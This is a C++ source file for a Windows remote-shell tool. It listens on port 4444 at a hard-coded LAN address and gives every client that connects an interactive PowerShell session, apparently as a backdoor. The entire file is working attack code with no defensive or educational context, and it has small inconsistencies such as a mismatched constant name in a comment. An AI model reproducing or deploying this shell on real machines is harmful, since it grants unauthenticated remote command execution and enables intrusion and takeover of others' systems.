#include <iostream>
#include "windows.h"

#include "lib/socket.h"
#include "lib/ReverseShell.h"
   
int main(int argc, char** argv) {
	 
	
	HANDLE sck;
	SOCKADDR_IN sin; 
	Socket * sock;
	Reverseshell * shell;
	    
	memset( &sin, 0, sizeof(sin) ); 
	 
	sin.sin_family 		= AF_INET;
	sin.sin_port   		= htons(4444);
	sin.sin_addr.s_addr = inet_addr("192.168.1.18");
	 
	sock = new Socket( &sin );
  	shell= new Reverseshell( );
   	 
  	if( sock->valid( ) ){  
  		  
  		sock->Bind();  
  		sock->Listen(1);  
  		for(;;){ 
  
  			Socket  * clts;
  			SOCKADDR_IN csin = {0};
  			       
  			if( ( clts = sock->Accept( &csin ) )->valid( ) ){
  				 
				// WIN_CMD = cmd.exe
				// WIN_PSW = powershell.exe
  	 			if( !shell->get( clts, WIN_PWS ) ){
  	 				clts->Close();; 	
				}else
				printf("[+] New user\r\n");;
			}
			Sleep(200);	
		}
		sock->Clean( );
  		sock->Close( );
	}else
	printf("[-] Sokcet invalid !");;
	
	ExitProcess(0);
  
	return 0;
}
